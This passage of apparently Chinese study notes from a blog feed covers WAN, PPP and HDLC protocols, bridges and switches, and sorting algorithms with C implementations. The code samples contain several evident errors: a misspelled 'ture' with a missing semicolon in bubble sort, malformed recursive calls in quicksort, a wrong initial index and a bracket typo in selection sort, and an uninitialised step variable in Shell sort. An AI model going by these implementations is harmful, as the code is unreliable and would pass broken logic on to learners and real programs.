/></center><p>&emsp;</p><h4 id="4-广域网"><a href="#4-广域网" class="headerlink" title="4. 广域网"></a>4. 广域网</h4><p>&emsp;&emsp;广域网，，通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它 能连接多个城市或国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络</p><p>&emsp;&emsp;广域网的通信子网主要使用分组交换技术。广域网的通信子网可以利用公用分组交换网、卫星通信网和无线 分组交换网，它将分布在不同地区的局域网或计算机系统互连起来，达到资源共享的目的。如因特网是世界范围内最大的广域网</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/12.png" style="zoom:80%;" /></center><p>&emsp;&emsp;接下来讲述的PPP协议和HDLC协议就是广域网中比较常用的协议内容</p><p>&emsp;</p><h4 id="5-PPP协议（面向字节）"><a href="#5-PPP协议（面向字节）" class="headerlink" title="5.PPP协议（面向字节）"></a>5.PPP协议（面向字节）</h4><p>&emsp;&emsp;点对点协议PPP是目前使用最广泛的数据链路层协议，用户使用拨号电话接入因特网时一般都使用PPP协议</p><p>&emsp;&emsp;注：PPP协议只支持全双开工链路</p><ul><li><h6 id="需要满足相关要求"><a href="#需要满足相关要求" class="headerlink" title="需要满足相关要求"></a>需要满足相关要求</h6></li></ul><p>&emsp;&emsp;协议简单：对于链路层的帧，无需纠错，无需序号，无需流量控制</p><p>&emsp;&emsp;封装成帧：帧定界符</p><p>&emsp;&emsp;透明传输：与帧定界符一样比特组合的数据应该如何处理，异步线路用字节填充，同步线路用比特填充</p><p>&emsp;&emsp;多中网络层协议：封装的IP数据报可以采用多种协议</p><p>&emsp;&emsp;多种类型链路：串行/并行，同步/异步，电/光….</p><p>&emsp;&emsp;差错检测：错就丢弃</p><p>&emsp;&emsp;检测连接状态：链路是否正常工作</p><p>&emsp;&emsp;最大传送单元：数据部分做大长度MTU</p><p>&emsp;&emsp;网络层地址协商：知道通信双方的网络层地址</p><p>&emsp;&emsp;数据压缩协商</p><ul><li><h6 id="无需满足的相关要求"><a href="#无需满足的相关要求" class="headerlink" title="无需满足的相关要求"></a>无需满足的相关要求</h6></li></ul><p>&emsp;&emsp;纠错</p><p>&emsp;&emsp;流量控制</p><p>&emsp;&emsp;序号</p><p>&emsp;&emsp;不支持多点线路</p><ul><li><h6 id="三个组成部分"><a href="#三个组成部分" class="headerlink" title="三个组成部分"></a>三个组成部分</h6></li></ul><p>&emsp;&emsp;1、一个将IP数据报封装到串行链路（同步串行/异步串行）的方法</p><p>&emsp;&emsp;2、链路控制协议LCP：建立并维护数据链路连接。（最重要的体现在身份验证的功能）</p><p>&emsp;&emsp;3、网络控制协议NCP：PPP可支持多种网络层协议，每个不同的网络层协议都要一个相应的NCP来偏置，为网络层协议建立和配置逻辑连接</p><ul><li><h6 id="协议状态图"><a href="#协议状态图" class="headerlink" title="协议状态图"></a>协议状态图</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/13.png" style="zoom:80%;" /></center><ul><li><h6 id="PPP协议的帧格式"><a href="#PPP协议的帧格式" class="headerlink" title="PPP协议的帧格式"></a>PPP协议的帧格式</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/14.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="6-HDLC协议（面向比特）"><a href="#6-HDLC协议（面向比特）" class="headerlink" title="6.HDLC协议（面向比特）"></a>6.HDLC协议（面向比特）</h4><p>&emsp;&emsp;高级数据链路控制（HDLC），是一个在同步网上传输数据、面向比特的数据链 路层协议，它是由国际标准化组织(ISO)根据IBM公司的SDLC协议扩展开发而成的</p><p>&emsp;&emsp;数据报文可透明传输，用于实现透明传输的“0比特插入法”易于硬件实现 </p><p>&emsp;&emsp;采用全双工通信 所有帧采用CRC检验，对信息帧进行顺序编号，可防止漏收或重份，传输可靠性提高</p><ul><li><h6 id="HDLC的站"><a href="#HDLC的站" class="headerlink" title="HDLC的站"></a>HDLC的站</h6></li></ul><p>&emsp;&emsp;HDLC有三种站的类型，分别是主站、从站、复合站</p><p>&emsp;&emsp;1、主站的的主要功能是发送命令（包括数据信息）帧、接收响应帧，并负责对整个链路的控制系统的初启、 流程的控制、差错检测或恢复等</p><p>&emsp;&emsp;2、从站的主要功能是接收由主站发来的命令帧，向主站发送响应帧，并且配合主站参与差错恢复等链路控制</p><p>&emsp;&emsp;3、复合站的主要功能是既能发送，又能接收命令帧和响应帧，并且负责整个链路的控制</p><ul><li><h6 id="三种数据操作方式"><a href="#三种数据操作方式" class="headerlink" title="三种数据操作方式"></a>三种数据操作方式</h6></li></ul><p>&emsp;&emsp;正常响应方式（主站说发送数据才能发送）</p><p>&emsp;&emsp;异步平衡方式（每一个复合站都可以对其他站进行传输）</p><p>&emsp;&emsp;异步响应方式（从站可以不经过主站的同意就直接传输）</p><ul><li><h6 id="HDLC的帧格式"><a href="#HDLC的帧格式" class="headerlink" title="HDLC的帧格式"></a>HDLC的帧格式</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;要记得HDLC帧的三中类型</p><p>&emsp;</p><h4 id="7-PPP协议＆HDLC协议对比"><a href="#7-PPP协议＆HDLC协议对比" class="headerlink" title="7.PPP协议＆HDLC协议对比"></a>7.PPP协议＆HDLC协议对比</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/16.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="8、链路层设备"><a href="#8、链路层设备" class="headerlink" title="8、链路层设备"></a>8、链路层设备</h4><ul><li><h6 id="物理层扩展以太网"><a href="#物理层扩展以太网" class="headerlink" title="物理层扩展以太网"></a>物理层扩展以太网</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/17.png" style="zoom:80%;" /></center><p>&emsp;</p><h6 id="9-网桥-amp-交换机"><a href="#9-网桥-amp-交换机" class="headerlink" title="9.网桥&amp;交换机"></a>9.网桥&amp;交换机</h6><p>&emsp;&emsp;网桥根据MAC帧的目的地址对帧进行转发发和过滤。当网桥收到一个帧时，并不向所有接口转发此帧，而是 先检查此帧的目的MAC地址，然后再确定将该帧转发到哪一个接口，或者是把它丢弃（即过滤）</p><p>&emsp;&emsp;网桥是交换机的前身，现在通常使用的是交换机了</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/18.png" style="zoom:80%;" /></center><ul><li><h6 id="网桥分类——透明网桥"><a href="#网桥分类——透明网桥" class="headerlink" title="网桥分类——透明网桥"></a>网桥分类——透明网桥</h6></li></ul><p>&emsp;&emsp;透明网桥：“透明”指以太网上的站点并不知道所发送的帧将经过哪几个网桥，是一种即插即用设备—— 自学习</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/19.png" style="zoom:80%;" /></center><ul><li><h6 id="网桥分类——源路由网桥"><a href="#网桥分类——源路由网桥" class="headerlink" title="网桥分类——源路由网桥"></a>网桥分类——源路由网桥</h6></li></ul><p>&emsp;&emsp;源路由网桥：在发送帧时，把详细的最佳路由信息（路由最少/时间最短）放在帧的首部中</p><p>&emsp;&emsp;使用的方法是源站以广播方式向欲通信的目的站发送一个发现帧</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/20.png" style="zoom:80%;" /></center><ul><li><h6 id="多接口网桥——以太网交换机"><a href="#多接口网桥——以太网交换机" class="headerlink" title="多接口网桥——以太网交换机"></a>多接口网桥——以太网交换机</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/21.png" style="zoom:80%;" /></center><ul><li><h6 id="以太网交换机的两种交换方式"><a href="#以太网交换机的两种交换方式" class="headerlink" title="以太网交换机的两种交换方式"></a>以太网交换机的两种交换方式</h6></li></ul><p>&emsp;&emsp;1、直通式交换机：</p><p>&emsp;&emsp;查完目的地址（6B）就立刻转发，延迟小，可靠性低，无法支持具有不同速率的端口的交换</p><p>&emsp;&emsp;2、存储转发式交换机：</p><p>&emsp;&emsp;将帧放入高速缓存，并检查是否正确，正确则转发，错误则丢。延迟大，可靠性高，可以支持具有不同速率的端口的交换</p><p>&emsp;</p><h4 id="10、冲突域和广播域"><a href="#10、冲突域和广播域" class="headerlink" title="10、冲突域和广播域"></a>10、冲突域和广播域</h4><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/22.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AD/23.png" style="zoom:80%;" /></center>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>排序</title>
    <link href="/2022/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/"/>
    <url>/2022/11/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/</url>
    
    <content type="html"><![CDATA[<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a>1.基本概念</h4><p>&emsp;&emsp;排序：就重新排列表汇总的元素，使表中的元素满足按关键字有序的过程</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/1.png" style="zoom:80%;" /></center><ul><li><h6 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h6></li></ul><p>&emsp;&emsp;算法的稳定性，若待排序表中有两个元素Ri和Rj，其对应的关键字相同即keyi = keyj，且在排序 前Ri在Rj的前⾯，若使⽤某⼀排序算法排序后，Ri仍然在Rj的前⾯，则称这个排序算法是稳定 的，否则称排序算法是不稳定的</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/2.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-插入排序"><a href="#2-插入排序" class="headerlink" title="2.插入排序"></a>2.插入排序</h4><ul><li><h6 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;每次将一个待排序的记录按其关键字大小插入到前面已经排好序的子序列中，直到全部记录插入完成</p><ul><li><h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//直接插入排序法一</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,temp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;n;i++)     <span class="hljs-comment">//将各个元素插入到已经排好序的序列中</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(A[i]&lt;A[i<span class="hljs-number">-1</span>])   <span class="hljs-comment">//若A[i]关键字小于前驱</span><br>        &#123;<br>            temp=A[i];     <span class="hljs-comment">//用temp暂存A[i]</span><br>            <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-1</span>;j&gt;=<span class="hljs-number">0</span>&amp;&amp; A[j]&gt;temp;--j)   <span class="hljs-comment">//检查所有前面已排号序的元素</span><br>                A[j+<span class="hljs-number">1</span>]=A[j];   <span class="hljs-comment">//所有大于temp的元素都往后挪</span><br>            A[j+<span class="hljs-number">1</span>]=temp;    <span class="hljs-comment">//复制到插入的位置</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//直接插入排序法二  哨兵法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;n;i++)     <span class="hljs-comment">//将各个元素插入到已经排好序的序列中</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(A[i]&lt;A[i<span class="hljs-number">-1</span>])   <span class="hljs-comment">//若A[i]关键字小于前驱</span><br>        &#123;<br>            A[<span class="hljs-number">0</span>]=A[i];     <span class="hljs-comment">//用A[0]暂存A[i]</span><br>            <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-1</span>;A[<span class="hljs-number">0</span>]&lt;A[j];--j)   <span class="hljs-comment">//检查所有前面已排号序的元素</span><br>                A[j+<span class="hljs-number">1</span>]=A[j];   <span class="hljs-comment">//所有大于A[0]的元素都往后挪</span><br>            A[j+<span class="hljs-number">1</span>]=A[<span class="hljs-number">0</span>];    <span class="hljs-comment">//复制到插入的位置</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析"><a href="#算法效率分析" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/3.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/4.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/5.png" style="zoom:80%;" /></center><ul><li><h6 id="算法优化——折半插入查找"><a href="#算法优化——折半插入查找" class="headerlink" title="算法优化——折半插入查找"></a>算法优化——折半插入查找</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//直接插入排序法二  哨兵法</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">InsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> i,j,low,high,mid;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">2</span>;i&lt;n;i++)     <span class="hljs-comment">//将各个元素插入到已经排好序的序列中</span><br>    &#123;<br>        A[<span class="hljs-number">0</span>]=A[i];<br>        low=<span class="hljs-number">1</span>;<br>        high=i<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span>(low&lt;=high)<br>        &#123;<br>            mid=(low+high)/<span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span>(A[mid]&gt;A[<span class="hljs-number">0</span>])<br>                high=mid<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">else</span><br>                low=mid+<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-1</span>;j&gt;=high+<span class="hljs-number">1</span>;--j)<br>            A[j+<span class="hljs-number">1</span>]=A[j];<br>        A[high+<span class="hljs-number">1</span>]=A[<span class="hljs-number">0</span>];     <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;</p><h4 id="3-希尔排序"><a href="#3-希尔排序" class="headerlink" title="3.希尔排序"></a>3.希尔排序</h4><ul><li><h6 id="算法思想-1"><a href="#算法思想-1" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;希尔排序：先将待排序表分割成若⼲形如 L[i, i + d, i + 2d,…, i + kd] 的“特殊”⼦表，对各个⼦表 分别进⾏直接插⼊排序。缩⼩增量d，重复上述过程，直到d=1为⽌。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/6.png" style="zoom:100%;" /></center><ul><li><h6 id="实现代码（考察频率不高）"><a href="#实现代码（考察频率不高）" class="headerlink" title="实现代码（考察频率不高）"></a>实现代码（考察频率不高）</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//希尔排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">ShellSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-type">int</span> d,i,j;<br>    <span class="hljs-comment">//A[0]只是暂存单元，不是哨兵，当j&lt;=0时，插入位置已到</span><br>    <span class="hljs-keyword">for</span>(d=d/<span class="hljs-number">2</span>;d&gt;=<span class="hljs-number">1</span>;d=d/<span class="hljs-number">2</span>)   <span class="hljs-comment">//步长变化</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(i=d+<span class="hljs-number">1</span>;i&lt;=n;++i)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(A[i]&lt;A[i-d])   <span class="hljs-comment">//需将A[i]插入有序增量子表中</span><br>            &#123;<br>                A[<span class="hljs-number">0</span>]=A[i];     <span class="hljs-comment">//暂存在A[0]</span><br>                <span class="hljs-keyword">for</span>(j=i-d;j&gt;<span class="hljs-number">0</span> &amp;&amp; A[<span class="hljs-number">0</span>]&lt;A[j];j-=d)<br>                &#123;<br>                    A[j+d]=A[j];   <span class="hljs-comment">//记录后移，查找插入的位置</span><br>                &#125;<br>                A[j+d]=A[<span class="hljs-number">0</span>];    <span class="hljs-comment">//插入</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-1"><a href="#算法效率分析-1" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/7.png" style="zoom:60%;" /></center><ul><li><h6 id="稳定性-1"><a href="#稳定性-1" class="headerlink" title="稳定性"></a>稳定性</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/8.png" style="zoom:70%;" /></center><p>&emsp;</p><h4 id="4-冒泡排序"><a href="#4-冒泡排序" class="headerlink" title="4.冒泡排序"></a>4.冒泡排序</h4><ul><li><h6 id="算法思想-2"><a href="#算法思想-2" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;基于“交换”的排序：根据序列中两个元素关键字的⽐较结果来对换这两个记录在序列中的位置</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/9.png" style="zoom:80%;" /></center><ul><li><h6 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//交换</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a,<span class="hljs-type">int</span> &amp;b)</span><br>&#123;<br>    <span class="hljs-type">int</span> temp = a;<br>    a = b;<br>    b= temp;<br>&#125;<br><br><span class="hljs-comment">//冒泡排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-1</span>;i++)<br>    &#123;<br>        <span class="hljs-type">bool</span> flag=<span class="hljs-literal">false</span>;    <span class="hljs-comment">//表示本次冒泡是否发生交换的标志</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=n<span class="hljs-number">-1</span>;j&gt;i;j--)    <span class="hljs-comment">//一趟冒泡过程</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(A[j<span class="hljs-number">-1</span>]&gt;A[j])     <span class="hljs-comment">//若为逆序</span><br>            &#123;<br>                swap(A[j<span class="hljs-number">-1</span>],A[j]);   <span class="hljs-comment">//交换</span><br>                flag=ture<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag==<span class="hljs-literal">false</span>)<br>            <span class="hljs-keyword">return</span>;   <span class="hljs-comment">//本次遍历后没有发生交换，说明表是已经有序的了</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-2"><a href="#算法效率分析-2" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/10.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="5-快速排序（重点）"><a href="#5-快速排序（重点）" class="headerlink" title="5.快速排序（重点）"></a>5.快速排序（重点）</h4><ul><li><h6 id="算法思想-3"><a href="#算法思想-3" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;在待排序表L[1…n]中任取⼀个元素pivot作为枢轴（或基准，通常取⾸元素），通过⼀趟排序将待排序表划 分为独⽴的两部分L[1…k-1]和L[k+1…n]，使得L[1…k-1]中的所有元素⼩于pivot，L[k+1…n]中的所有元素⼤于等于 pivot，则pivot放在了其最终位置L(k)上，这个过程称为⼀次“划分”。然后分别递归地对两个⼦表重复上述过程，直⾄ 每部分内只有⼀个元素或空为⽌，即所有元素放在了其最终位置上。</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/11.png" style="zoom:80%;" /></center><ul><li><h6 id="实现代码-2"><a href="#实现代码-2" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//用第一个元素将待排序序列划分成左右两个部分</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">Partiton</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span><br>&#123;<br>    <span class="hljs-type">int</span> pivot=A[low];     <span class="hljs-comment">//第一个元素作为枢轴</span><br>    <span class="hljs-keyword">while</span>(low&lt;high)       <span class="hljs-comment">//用low，high搜索枢轴的最终位置</span><br>    &#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;A[high]&gt;=pivot)<br>            --high;<br>        A[low]=A[high];      <span class="hljs-comment">//比枢轴小的元素移动到左键</span><br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;A[low]&lt;=pivot)<br>            ++low;<br>        A[high]=A[low];    <span class="hljs-comment">//比枢轴大的元素移动到右端 </span><br>    &#125;<br>    A[low]=pivot;    <span class="hljs-comment">//枢轴元素存放的最终位置</span><br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br><br><span class="hljs-comment">//快速排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">QuickSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)  <span class="hljs-comment">//递归跳出条件</span><br>    &#123;<br>        <span class="hljs-type">int</span> pivotpos=Partiton(A,low,high);   <span class="hljs-comment">//划分</span><br>        QuickSort(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high);  <span class="hljs-comment">//划分左子表</span><br>        QuickSort(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)  <span class="hljs-comment">//划分右字表</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-3"><a href="#算法效率分析-3" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/12.png" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/13.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-简单选择排序"><a href="#6-简单选择排序" class="headerlink" title="6.简单选择排序"></a>6.简单选择排序</h4><ul><li><h6 id="算法思想-4"><a href="#算法思想-4" class="headerlink" title="算法思想"></a>算法思想</h6></li></ul><p>&emsp;&emsp;每⼀趟在待排序元素中选取关键字最⼩的元素加⼊有序⼦序列</p><ul><li><h6 id="实现代码-3"><a href="#实现代码-3" class="headerlink" title="实现代码"></a>实现代码</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//简单选择排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">SelectSort</span><span class="hljs-params">(<span class="hljs-type">int</span> A[],<span class="hljs-type">int</span> n)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n<span class="hljs-number">-1</span>;i++)    <span class="hljs-comment">//一共进行了n-1趟</span><br>    &#123; <br>        <span class="hljs-type">int</span> min=<span class="hljs-number">1</span>;             <span class="hljs-comment">//记录最小元素位置</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;n;j++)  <span class="hljs-comment">//在A[i...n-1]中选择最小的元素</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(A[j]&lt;A[min])    <span class="hljs-comment">//更新最小的元素位置</span><br>                min=j;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(min!=i)             <span class="hljs-comment">//封装的swap()函数进行移动</span><br>            swap([A[i],A[min]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><h6 id="算法效率分析-4"><a href="#算法效率分析-4" class="headerlink" title="算法效率分析"></a>算法效率分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%8D%81/14.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="7-堆排序"><a href="#7-堆排序" class="headerlink" title="7.堆排序"></a>7.堆排序</h4><ul><li><h6 id="堆的定义"><a href="#堆的定义" class="headerlink" title="堆的定义"></a>堆的定义</h6></li></ul><p>&emsp;&emsp;若n个关键字序列L[1…n] 满⾜下⾯某⼀条性质，则称为堆（Heap）： </p><p>&emsp;&emsp;① 